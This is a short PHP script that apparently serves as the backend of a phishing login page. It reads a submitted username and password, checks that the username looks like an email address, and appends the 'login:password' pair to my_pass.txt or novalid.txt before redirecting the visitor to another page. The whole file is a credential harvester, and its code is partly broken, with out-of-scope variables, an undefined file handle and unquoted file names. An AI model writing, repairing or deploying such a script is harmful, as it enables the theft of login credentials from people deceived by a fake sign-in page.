<?php
	$pass = $_POST['pass'];
    $login = $_POST['username'];
    
    function rec($a)
{
    $file = fopen($a, 'at');
    fwrite($file,$login);
    fseek($fd, 0, SEEK_END);
    fwrite($file,':');
    fseek($fd, 0, SEEK_END);
    fwrite($file,$pass );
    fwrite($file,"\r\n");
    fclose($file);
}
	if (preg_match("/^(?:[a-z0-9]+(?:[-_.]?[a-z0-9]+)?@[a-z0-9_.-]+(?:\.?[a-z0-9]+)?\.[a-z]{2,5})$/i", $login))
		{
        rec(my_pass.txt);
        header('Location:sit.html');
		}
		else
		{
        rec(novalid.txt);
        header('Location:index1.html');
		}	
?>